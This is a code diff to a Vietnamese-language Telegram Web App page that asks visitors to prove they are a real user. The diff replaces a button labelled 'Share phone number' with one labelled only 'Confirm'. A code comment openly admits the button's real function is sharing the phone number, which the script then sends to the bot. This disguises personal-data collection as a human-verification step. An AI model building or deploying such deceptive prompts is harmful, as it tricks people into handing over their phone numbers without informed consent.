@@ -87,25 +87,33 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
 Bạn cần xác nhận mình là người dùng thật , hãy
      nhấp vào nút bên dưới để bắt đầu !
   </div>
-  
-  <!-- Nút Share số điện thoại -->
-<button class="step-btn" onclick="sharePhone()">📲 Chia sẻ số điện thoại</button>
+ <!-- Nút Xác nhận (nhưng chức năng share số) -->
+<button class="step-btn" id="confirm-btn">Xác nhận</button>
 
 <script>
-  const tg = window.Telegram.WebApp;
-  tg.expand(); // mở rộng Web App
+document.addEventListener("DOMContentLoaded", () => {
+    const tg = window.Telegram.WebApp;
+    tg.expand(); // mở rộng Web App
+    const mainButton = tg.MainButton;
 
-  function sharePhone() {
-      // Cấu hình MainButton Telegram
-      tg.MainButton.setText("📲 Xác nhận chia sẻ số");
-      tg.MainButton.color = "#2cab37";
-      tg.MainButton.show();
+    const confirmBtn = document.getElementById("confirm-btn");
+    let listenerAdded = false; // gắn listener 1 lần duy nhất
 
-      // Khi nhấn MainButton → gửi dữ liệu về bot
-      tg.MainButton.onClick(() => {
-          tg.sendData(JSON.stringify({ request: "phone_number" }));
-          tg.MainButton.hide(); // ẩn nút sau khi nhấn
-          alert("Bạn vừa gửi số điện thoại cho bot."); // popup xác nhận
-      });
-  }
+    confirmBtn.addEventListener("click", () => {
+        // Cấu hình MainButton Telegram
+        mainButton.setText("📲 Xác nhận chia sẻ số"); // Telegram hiển thị popup xác nhận share
+        mainButton.color = "#2cab37";
+        mainButton.show();
+
+        if (!listenerAdded) {
+            mainButton.onClick(() => {
+                // Gửi dữ liệu số điện thoại về bot
+                tg.sendData(JSON.stringify({ request: "phone_number" }));
+                mainButton.hide();
+                alert("Bạn vừa gửi số điện thoại cho bot."); // popup xác nhận
+            });
+            listenerAdded = true;
+        }
+    });
+});
 </script>
